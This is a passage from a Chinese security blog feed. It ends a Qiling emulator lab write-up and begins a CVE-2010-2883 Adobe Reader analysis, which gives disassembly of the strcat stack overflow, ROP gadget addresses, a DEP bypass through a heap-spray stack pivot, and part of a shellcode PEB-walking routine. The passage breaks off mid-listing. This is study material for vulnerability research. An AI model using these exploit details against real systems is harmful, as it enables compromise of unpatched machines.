class="title function_">challenge8</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    hook_addr = base_addr + <span class="number">0x11dc</span></span><br><span class="line">    q1.hook_address(hook_nop, hook_addr)</span><br></pre></td></tr></table></figure><p>方法2:内存搜索magic</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">q1</span>):</span><br><span class="line">    MAGIC = <span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">    magic_addrs = q1.mem.search(q1.pack64(MAGIC))</span><br><span class="line">    <span class="keyword">for</span> magic_addr <span class="keyword">in</span> magic_addrs:</span><br><span class="line">        <span class="comment"># 验证是否找到正确的结构体地址</span></span><br><span class="line">        candidate_heap_struct_addr = magic_addr - <span class="number">8</span></span><br><span class="line">        candidate_heap_struct = q1.mem.read(candidate_heap_struct_addr, <span class="number">24</span>)</span><br><span class="line">        string_addr, _, check_addr = struct.unpack(<span class="string">&#x27;QQQ&#x27;</span>, candidate_heap_struct)</span><br><span class="line">        <span class="keyword">if</span> q1.mem.string(string_addr) == <span class="string">&#x27;Random data&#x27;</span>:</span><br><span class="line">            q1.mem.write(check_addr, <span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    hook_addr = base_addr + <span class="number">0x11dc</span></span><br><span class="line">    q1.hook_address(search_mem, hook_addr)</span><br></pre></td></tr></table></figure><h1 id="challenge9-hook外部函数-tolower"><a href="#challenge9-hook外部函数-tolower" class="headerlink" title="challenge9 : hook外部函数 tolower"></a>challenge9 : hook外部函数 tolower</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled9.png" class title="Untitled"><p>简单set_api处理一下得了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tolower_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.set_api(<span class="string">&quot;tolower&quot;</span>, tolower_hook)</span><br></pre></td></tr></table></figure><h1 id="challenge10-劫持fs"><a href="#challenge10-劫持fs" class="headerlink" title="challenge10: 劫持fs"></a>challenge10: 劫持fs</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled10.png" class title="Untitled"><p>和challenge3差不多，用QlFsMappedObject劫持</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_cmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.add_fs_mapper(<span class="string">&quot;/proc/self/cmdline&quot;</span>, Fake_cmdline())</span><br></pre></td></tr></table></figure><h1 id="challenge11-指令级别hook"><a href="#challenge11-指令级别hook" class="headerlink" title="challenge11 : 指令级别hook"></a>challenge11 : 指令级别hook</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled11.png" class title="Untitled"><p>需要我们hook 0x1013ec这条指令，并把x0寄存器的值改成0x1337 &lt;&lt; 0x10，使用hook_code对这条指令进行指令级hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_midr_el1</span>(<span class="params">q1, addr, size</span>):</span><br><span class="line">    <span class="keyword">if</span> q1.mem.read(addr, size) == <span class="string">b&#x27;\x00\x00\x38\xD5&#x27;</span>:</span><br><span class="line">        q1.arch.regs.x0 = <span class="number">0x1337</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">        q1.arch.regs.arch_pc +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.hook_code(hook_midr_el1)</span><br></pre></td></tr></table></figure><p>也可以在主程序运行时hook，这样hook函数就不会在共享库的目标指令出发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">q1</span>):</span><br><span class="line">    mem_map = q1.mem.map_info</span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> mem_map:</span><br><span class="line">        start, end, flags, label = entry</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># [=]     555555554000 - 555555556000   r-x (5)    [redacted]/qilinglab-aarch64 </span></span><br><span class="line">        <span class="keyword">if</span> q1.path <span class="keyword">in</span> label <span class="keyword">and</span> flags == <span class="number">5</span>:</span><br><span class="line"><span class="comment">#5表示的是r-x属性，加这个判断也是为了缩小hook的范围，提高性能。</span></span><br><span class="line">            start_hook = start</span><br><span class="line">            end_hook = end</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Use begin and end parameters to specify the range of the hook</span></span><br><span class="line">    q1.hook_code(hook_midr_el1, begin=start_hook, end=end_hook)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-2883-Adobe Reader TTF SING</title>
      <link href="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/"/>
      <url>/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/riusksk/vul_war">https://github.com/riusksk/vul_war</a></p><p>栈溢出、ROPchainr绕过DEP</p><p>参考：<a href="https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">https://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/</a></p><p>PDF文档中包含<code>字体对象</code>，该漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中所包含的<code>SING表</code>的<code>uniqueName字段</code>进行长度校验就执行了strcat，导致了<code>栈溢出</code>漏洞的发生。下面是我通过<code>PdfStreamDumper</code>读出来的一些PDF的内容：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/Type /Font         <span class="comment">//字体对象</span></span><br><span class="line">    /Subtype /TrueType  <span class="comment">//字体类型是TrueType</span></span><br><span class="line">    /Name /F1</span><br><span class="line">    /BaseFont /Cinema   <span class="comment">//基于Cinema字体</span></span><br><span class="line">    /Widths []</span><br><span class="line">    /FontDescriptor <span class="number">9</span> <span class="number">0</span> R   <span class="comment">//对象9是字体描述对象</span></span><br><span class="line">    /Encoding /MacRomanEncoding     <span class="comment">//字符编码采用MacRoman</span></span><br></pre></td></tr></table></figure><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled.png" class title="Untitled"><p>TrueType字体用machintosh的轮廓字体资源的格式编码，有一个唯一的标记名”sfnt”。windows没有macintosh的位图字体资源格式，</p><p>字体目录包含了字体格式的版本号和几个表，每个表都有一个TableEntry结构项，TableEntry结构包含了资源标记、校验和、偏移量和每个表的大小。下面是TrueType字体目录的c语言定义：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也就是SING表上的数据</span></span><br><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记：&quot;SING&quot;</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和：&quot;0xD9BCC8B5&quot;</span></span><br><span class="line">    ULONG offset;       <span class="comment">//表偏移：&quot;0x0000011c&quot;</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度：&quot;0x00001DDF&quot;</span></span><br><span class="line">&#125;TableEntry;</span><br><span class="line"><span class="comment">//TrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果一TrueType字体以00 01 00 00 ,00 17开头，我们就可以知道它的格式是轮廓字体资源（”sfnt”）版本1.0的格式，有23个表。</p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled1.png" class title="Untitled"><p>ida分析CoolType.dll找到SING字符串，交叉引用找到ParseSING的函数如下</p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled2.png" class title="Untitled"><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled3.png" class title="Untitled"><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">0803</span>DCF9 ParseSING       proc near               ; CODE XREF: sub_803A3B2+<span class="number">55</span>↑p</span><br><span class="line">.text:<span class="number">0803</span>DCF9                                         ; sub_803DFF4+<span class="number">28</span>↓p ...</span><br><span class="line">.text:<span class="number">0803</span>DCF9</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_160         = byte ptr <span class="number">-160</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_140         = dword ptr <span class="number">-140</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_138         = dword ptr <span class="number">-138</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_134         = dword ptr <span class="number">-134</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_130         = dword ptr <span class="number">-130</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_12C         = dword ptr <span class="number">-12</span>Ch</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_128         = dword ptr <span class="number">-128</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_124         = dword ptr <span class="number">-124</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_120         = dword ptr <span class="number">-120</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_119         = byte ptr <span class="number">-119</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_114         = dword ptr <span class="number">-114</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_10C         = dword ptr <span class="number">-10</span>Ch</span><br><span class="line">.text:<span class="number">0803</span>DCF9 Destination_uniquename= byte ptr <span class="number">-108</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0803</span>DCF9 arg_0           = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0803</span>DCF9 arg_4           = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0803</span>DCF9 arg_8           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9 arg_C           = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0803</span>DCF9</span><br><span class="line">.text:<span class="number">0803</span>DCF9 ; FUNCTION CHUNK AT .text:<span class="number">0808</span>D418 SIZE <span class="number">0000000</span>E BYTES</span><br><span class="line">.text:<span class="number">0803</span>DCF9 ; FUNCTION CHUNK AT .text:<span class="number">08184</span>A24 SIZE <span class="number">00000058</span> BYTES</span><br><span class="line">.text:<span class="number">0803</span>DCF9</span><br><span class="line">.text:<span class="number">0803</span>DCF9 ; __unwind &#123; <span class="comment">// loc_8184A54</span></span><br><span class="line">.text:<span class="number">0803</span>DCF9                 push    ebp</span><br><span class="line">.text:<span class="number">0803</span>DCFA                 sub     esp, <span class="number">104</span>h</span><br><span class="line">.text:<span class="number">0803</span>DD00                 lea     ebp, [esp<span class="number">-4</span>]    ; esp<span class="number">-4</span>赋给ebp,而不是esp<span class="number">-4</span>处的值赋给ebp,后面strcat会把执行结果保存在以ebp为起始地址的栈空间中</span><br><span class="line">.text:<span class="number">0803</span>DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:<span class="number">0803</span>DD09                 xor     eax, ebp</span><br><span class="line">.text:<span class="number">0803</span>DD0B                 mov     [ebp+<span class="number">108</span>h+var_4], eax ; 将和ebp异或完的security_cookie存到栈上父函数ebp之前的<span class="number">4</span>字节中</span><br><span class="line">.text:<span class="number">0803</span>DD11                 push    <span class="number">4</span>Ch             ; __EH_prolog3_catch函数中分配栈空间的大小</span><br><span class="line">.text:<span class="number">0803</span>DD13                 mov     eax, offset loc_8184A54 ; 调用__security_check_cookie函数的代码段起始地址</span><br><span class="line">.text:<span class="number">0803</span>DD18                 call    __EH_prolog3_catch ; 向栈上写入SEH结构</span><br><span class="line">.text:<span class="number">0803</span>DD1D                 mov     eax, [ebp+<span class="number">108</span>h+arg_C]</span><br><span class="line">.text:<span class="number">0803</span>DD23                 mov     edi, [ebp+<span class="number">108</span>h+arg_0]</span><br><span class="line">.text:<span class="number">0803</span>DD29                 mov     ebx, [ebp+<span class="number">108</span>h+arg_4]</span><br><span class="line">.text:<span class="number">0803</span>DD2F                 mov     [ebp+<span class="number">108</span>h+var_130], edi</span><br><span class="line">.text:<span class="number">0803</span>DD32                 mov     [ebp+<span class="number">108</span>h+var_138], eax</span><br><span class="line">.text:<span class="number">0803</span>DD35                 call    sub_804172C</span><br><span class="line">.text:<span class="number">0803</span>DD3A                 xor     esi, esi</span><br><span class="line">.text:<span class="number">0803</span>DD3C                 cmp     dword ptr [edi+<span class="number">8</span>], <span class="number">3</span></span><br><span class="line">.text:<span class="number">0803</span>DD40 ;   try &#123;</span><br><span class="line">.text:<span class="number">0803</span>DD40                 mov     [ebp+<span class="number">108</span>h+var_10C], esi</span><br><span class="line">.text:<span class="number">0803</span>DD43                 jz      loc_803DF00</span><br><span class="line">.text:<span class="number">0803</span>DD49                 mov     [ebp+<span class="number">108</span>h+var_124], esi</span><br><span class="line">.text:<span class="number">0803</span>DD4C                 mov     [ebp+<span class="number">108</span>h+var_120], esi</span><br><span class="line">.text:<span class="number">0803</span>DD4F                 cmp     dword ptr [edi+<span class="number">0</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0803</span>DD4F ;   &#125; <span class="comment">// starts at 803DD40</span></span><br><span class="line">.text:<span class="number">0803</span>DD53 ;   try &#123;</span><br><span class="line">.text:<span class="number">0803</span>DD53                 mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0803</span>DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:<span class="number">0803</span>DD5D                 push    offset aName    ; <span class="string">&quot;name&quot;</span></span><br><span class="line">.text:<span class="number">0803</span>DD62                 push    edi             ; <span class="type">int</span></span><br><span class="line">.text:<span class="number">0803</span>DD63                 lea     ecx, [ebp+<span class="number">108</span>h+var_124]</span><br><span class="line">.text:<span class="number">0803</span>DD66                 mov     [ebp+<span class="number">108</span>h+var_119], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0803</span>DD6A                 call    sub_80217D7</span><br><span class="line">.text:<span class="number">0803</span>DD6F                 cmp     [ebp+<span class="number">108</span>h+var_124], esi</span><br><span class="line">.text:<span class="number">0803</span>DD72                 jnz     <span class="type">short</span> loc_803DDDD</span><br><span class="line">.text:<span class="number">0803</span>DD74                 push    offset aSing    ; <span class="string">&quot;SING&quot;</span></span><br><span class="line">.text:<span class="number">0803</span>DD79                 push    edi             ; <span class="type">int</span></span><br><span class="line">.text:<span class="number">0803</span>DD7A                 lea     ecx, [ebp+<span class="number">108</span>h+var_12C] ; ecx为字体对象,thiscall,ecx传参,指向SING表入口</span><br><span class="line">.text:<span class="number">0803</span>DD7D                 call    sub_8021B06     ; 处理sing表</span><br><span class="line">.text:<span class="number">0803</span>DD82                 mov     eax, [ebp+<span class="number">108</span>h+var_12C] ; sing表 = shellcode</span><br><span class="line">.text:<span class="number">0803</span>DD85                 cmp     eax, esi        ; 比较是否为空</span><br><span class="line">.text:<span class="number">0803</span>DD85 ;   &#125; <span class="comment">// starts at 803DD53</span></span><br><span class="line">.text:<span class="number">0803</span>DD87 ;   try &#123;</span><br><span class="line">.text:<span class="number">0803</span>DD87                 mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span></span><br><span class="line">.text:<span class="number">0803</span>DD8B                 jz      <span class="type">short</span> loc_803DDC4 ; 不跳转</span><br><span class="line">.text:<span class="number">0803</span>DD8D                 mov     ecx, [eax]      ; 字体资源版本号，<span class="number">1.0</span>版本为<span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">0803</span>DD8F                 and     ecx, <span class="number">0</span>FFFFh</span><br><span class="line">.text:<span class="number">0803</span>DD95                 jz      <span class="type">short</span> loc_803DD9F ; 跳这里</span><br><span class="line">.text:<span class="number">0803</span>DD97                 cmp     ecx, <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">0803</span>DD9D                 jnz     <span class="type">short</span> loc_803DDC0</span><br><span class="line">.text:<span class="number">0803</span>DD9F</span><br><span class="line">.text:<span class="number">0803</span>DD9F loc_803DD9F:                            ; CODE XREF: ParseSING+<span class="number">9</span>C↑j</span><br><span class="line">.text:<span class="number">0803</span>DD9F                 add     eax, <span class="number">10</span>h        ; 相对SING表入口处<span class="number">0x10</span>找到uniqueName</span><br><span class="line">.text:<span class="number">0803</span>DDA2                 push    eax             ; Source</span><br><span class="line">.text:<span class="number">0803</span>DDA3                 lea     eax, [ebp+<span class="number">108</span>h+Destination_uniquename] ; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span><br><span class="line">.text:<span class="number">0803</span>DDA6                 push    eax             ; Destination</span><br><span class="line">.text:<span class="number">0803</span>DDA7                 mov     [ebp+<span class="number">108</span>h+Destination_uniquename], <span class="number">0</span> ; 将目标字符串赋值为<span class="literal">NULL</span>,空字符串</span><br><span class="line">.text:<span class="number">0803</span>DDAB                 call    strcat          ; leak</span><br><span class="line">.text:<span class="number">0803</span>DDB0                 pop     ecx</span><br><span class="line">.text:<span class="number">0803</span>DDB1                 pop     ecx</span><br><span class="line">.text:<span class="number">0803</span>DDB2                 lea     eax, [ebp+<span class="number">108</span>h+Destination_uniquename]</span><br><span class="line">.text:<span class="number">0803</span>DDB5                 push    eax</span><br><span class="line">.text:<span class="number">0803</span>DDB6                 mov     ecx, ebx</span><br><span class="line">.text:<span class="number">0803</span>DDB8                 call    sub_8001243</span><br><span class="line">.text:<span class="number">0803</span>DDBD                 mov     eax, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">.text:<span class="number">0803</span>DDC0</span><br></pre></td></tr></table></figure><p><strong>动调观察并回溯：</strong></p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled4.png" class title="Untitled"><p>在<code>0x0803DD9F</code>下断点,运行程序，可以看到复制到栈上的<code>数据长度</code>：0x0012E718 - 0x0012E4D8 &#x3D; 0x240</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ecx=ebx=0x0012E608,对象(0x0012E608)的指针,第一个成员变量原来是0,可以直接跳过sub_8001243()的一段代码,但是我们构造的uniqueName不能将这里构造为0x0,会造成截断,其内容+0x1c必须为一个可访问的地址,使得程序可以顺利执行通过第一个成员变量为0时跳过的那段代码。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>strcat执行之后会将uniquename起始部分复制到0x0012E4D8直到NULL字符</p><p>DEP（Data Execution Prevention）：防止一些内存位置执行代码的一种保护机制，特别是堆栈，因此在windows中利用栈返回技术攻击溢出的方法已不再适用了。</p><p>ROP（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。</p><p><strong>利用过程：</strong></p><p>我们从<code>metasploit</code>的漏洞利用代码中可以知道<code>SING表的数据</code>主要是构造了一个**<code>ROP链</code><strong>,用于<code>控制EIP</code>最终跳转到<code>堆喷</code>的真正的用于<code>绕过DEP</code>的<code>ROP Chain</code>处。从代码注释中可知,</strong><code>第一个ROPgadget</code><strong>位于icucnv36.dll中的<code>0x4A80CB38</code>处,</strong><code>第二个ROPgadget</code>**位于icucnv36.dll中的<code>0x4A82A714</code>处。这部分后面会介绍,为什么选用这两个地址呢？因为在<code>Adobe Reader</code>的<code>各个版本</code>上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p><p><a href="https://www.notion.so/3d37050201a34b2ebedbab9a12696f2a?pvs=21">堆喷</a></p><p><strong>触发过程：</strong></p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled5.png" class title="Untitled"><p><code>样本</code>构造的<code>SING表</code>的<code>“uniqueName”字段</code>将栈上<code>对象(0x0012E6B0)</code>的一个<code>函数指针</code>类型的<code>成员变量(0x0012E6D0)</code>覆盖为了<code>ROPgadget(0x4A80CB38)</code>的地址。而触发点为<code>StreamHandler类</code>的<code>虚函数sub_808B116()</code>中地址<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,这条调用指令将<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)的值</code>作为调用地址,从而获得程序执行流的劫持。这个<code>函数指针的地址</code>又存储在<code>对象(0x0012E718)</code>中的一个<code>指针类型</code>的<code>成员变量(0x0012E754)</code>中。<code>虚函数sub_808B116()</code>通过传入的<code>参数对象(0x0012E718)</code>的指针,找到<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)</code>,进行函数调用,从而获得程序执行流的劫持。</p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled6.png" class title="Untitled"><p><strong>样本中SING表数据“0x4A8A08C6”的作用：</strong></p><p><code>0x4A8A08C6</code>是一个<code>地址值</code>,<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>应具有<code>可读可写</code>权限。因为,在通过<code>strcat()</code>将<code>SING表数据</code>复制到<code>栈</code>上之后,以及获得<code>程序执行流</code>的劫持之前,会对<code>此地址</code>进行<code>读写</code>,所以构造的样本中<code>此处的地址+0x1C</code>必须具有<code>可读可写</code>权限,否则会<code>触发异常</code>,通过<code>SEH链</code>进入异常处理,就无法获得程序执行流的劫持。</p><p><strong>分析ROPgadget1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A80CB38    81C5 94070000   add ebp,0x794 ; ebp=0x0012DD48+0x794=0x0012E4DC</span><br><span class="line">icucnv36.4A80CB3E    C9              leave         ; 如下</span><br><span class="line">icucnv36.4A80CB3F    C3              retn</span><br><span class="line"></span><br><span class="line">leave:</span><br><span class="line">mov esp,ebp ; esp=ebp=0x0012E4DC</span><br><span class="line">pop ebp     ; esp=esp+0x4=0x0012E4E0 -&gt; ROPgadget2</span><br></pre></td></tr></table></figure><p><strong>分析ROPgadget2:</strong></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">icucnv36<span class="number">.4</span>A82A712    FF50 <span class="number">5</span>C         call dword ptr ds:[eax+<span class="number">0x5C</span>]</span><br><span class="line">icucnv36<span class="number">.4</span>A82A715    C3              retn</span><br><span class="line"></span><br><span class="line">icucnv36<span class="number">.4</span>A82A714    <span class="number">5</span>C              pop esp ; esp=<span class="number">0x0C0C0C0C</span>                       </span><br><span class="line">icucnv36<span class="number">.4</span>A82A715    C3              retn</span><br></pre></td></tr></table></figure><p><code>DEP</code>(Data Execution Prevention),即<code>数据执行保护</code>。开启后,<code>堆栈</code>是不具有<code>执行权限</code>的,所以不能直接在<code>缓冲区</code>中填入<code>Payload</code>。而<code>ROP</code>(Return-Oriented Programming),<code>返回导向编程</code>,则是通过程序中<code>已存在</code>的多段小的<code>代码片段(ROPgadget)</code>来控制程序执行流的。缓冲区中填入的只是<code>代码片段的首地址</code>。样本中使用了<code>两段ROPgadget</code>代码片段用于<code>绕过DEP</code>。</p><h3 id="通过TEB实现shellcode位置"><a href="#通过TEB实现shellcode位置" class="headerlink" title="通过TEB实现shellcode位置"></a>通过TEB实现shellcode位置</h3><p>寻找模块装载地址：<a href="https://4hou.win/wordpress/?p=8945">https://4hou.win/wordpress/?p=8945</a></p><p>当<code>exe</code>文件载入内存时，在NT内核系统中<code>fs:[0]</code>指向了<code>TEB</code>结构，<code>TEB(Thread Environment Block)</code>位于用户地址空间，进程中的每个线程都有自己的一个TEB，然后找到PEB，然后找到PEB_LDR_DATA，然后找到LIST_ENRTY然后找到_LDR_DATA_TABLE_ENTRY就可以找到dll</p><img src="/2023/01/09/CVE-2010-2883-Adobe-Reader-TTF-SING/Untitled7.png" class title="Untitled"><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MOV EAX, FS:[<span class="number">30</span>] <span class="comment">// EAX = PEB基址 </span></span><br><span class="line"></span><br><span class="line">MOV EAX, [EAX+C] <span class="comment">//EAX = PEB_LDR_DATA结构指针 </span></span><br><span class="line"></span><br><span class="line">MOV ESI, [EAX+<span class="number">14</span>] <span 